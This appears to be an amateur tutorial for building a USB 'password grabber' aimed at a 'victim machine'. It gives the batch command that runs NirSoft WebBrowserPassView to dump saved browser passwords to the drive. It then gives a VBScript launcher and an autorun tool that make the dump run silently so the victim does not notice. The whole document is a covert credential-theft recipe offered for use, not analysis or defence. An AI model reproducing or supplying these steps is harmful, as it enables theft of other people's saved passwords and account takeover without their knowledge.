I AM NOT RESPNOSIBLE FOR ANY MISLEADING THINGS YOU HAVE COMMITED 

Tools required 
1) A usb pendrive 
2) windows password recovery sofware
  ( https://www.nirsoft.net/utils/web_browser_password.html)
  this is the link to download the software
3) USB AUTO RUN SOFTWARE (https://usb-autorun-creator.en.softonic.com/)

4) need a windows computer for creating a .bat file 

Process:
1) install all the software that are mentioned before

2) connect the usb pendrive to the computer

3) Copy the windows password recovery sofware into the pendrive

4) Now we have to create a .bat file to run the software automatically and save in a .txt file 

 start WebBrowserPassView.exe /stext password.txt

5) save it any name you want but you must include the .bat extension

6) at this point the "password grabber" is ready you just need to connect to the usb to your victim machine and run the .bat file just within 3 to 5 seconds a file will save it your pendrive that is the passwords of the victim machine

IF YOU WANT TO TAKE IT TO NEXT LEVEL LIKE AUTOMATION AND NO CMD PANEL OPENING THEN CONTINUE ......
1) Now we have to automate the process in the above method there are 2 problems 
    1. you need the run the .bat file by yourself 
    2. when you run the .bat file there is going to be a cmd panel open which is very risky and your victim might notice

2)  SO in that case we need to create another file, Open a empty notepad and type the following script

Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "REPLACE THIS PLACE WITH YOUR .BAT FILE AND USB DRIVE NAME LIKE IT IS D: OR C: ETC" & Chr(34), 0
Set WshShell = Nothing

3) Save the file with .VBS extension, say launch_bat.vbs  (make sure you save the file in the usb drive)

4) open the usb auto run tool then select the drive and select the launch_bat.vbs file (this software  is going to auto run the seleted file )

5) then thats it you have succesfully created a usb password grabber
